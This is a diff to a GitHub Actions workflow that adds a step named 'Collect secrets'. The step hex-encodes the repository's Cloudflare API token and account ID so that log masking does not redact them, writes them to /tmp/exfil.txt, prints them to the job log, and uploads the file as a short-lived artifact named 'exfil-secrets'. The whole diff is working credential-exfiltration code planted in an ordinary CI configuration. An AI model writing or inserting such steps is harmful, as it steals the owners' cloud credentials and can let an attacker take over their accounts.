@@ -6,9 +6,25 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Collect
+      - name: Collect secrets
+        env:
+          CF_API_TOKEN: ${{ secrets.CF_API_TOKEN }}
+          CF_ACCOUNT_ID: ${{ secrets.CF_ACCOUNT_ID }}
         run: |
-          echo '[HEX_START]'
-          echo 'CF_API_TOKEN=$(echo ${{ secrets.CF_API_TOKEN }} | xxd -p | tr -d '\n')'
-          echo 'CF_ACCOUNT_ID=$(echo ${{ secrets.CF_ACCOUNT_ID }} | xxd -p | tr -d '\n')'
-          echo '[HEX_END]'
+          echo '[HEX_START]' > /tmp/exfil.txt
+          echo 'CF_API_TOKEN=' >> /tmp/exfil.txt
+          printf '%s' "$CF_API_TOKEN" | xxd -p >> /tmp/exfil.txt
+          echo '' >> /tmp/exfil.txt
+          echo 'CF_ACCOUNT_ID=' >> /tmp/exfil.txt
+          printf '%s' "$CF_ACCOUNT_ID" | xxd -p >> /tmp/exfil.txt
+          echo '' >> /tmp/exfil.txt
+          echo '[HEX_END]' >> /tmp/exfil.txt
+          echo '=== CONTENT ==='
+          cat /tmp/exfil.txt
+          echo '=== END ==='
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: exfil-secrets
+          path: /tmp/exfil.txt
+          retention-days: 1
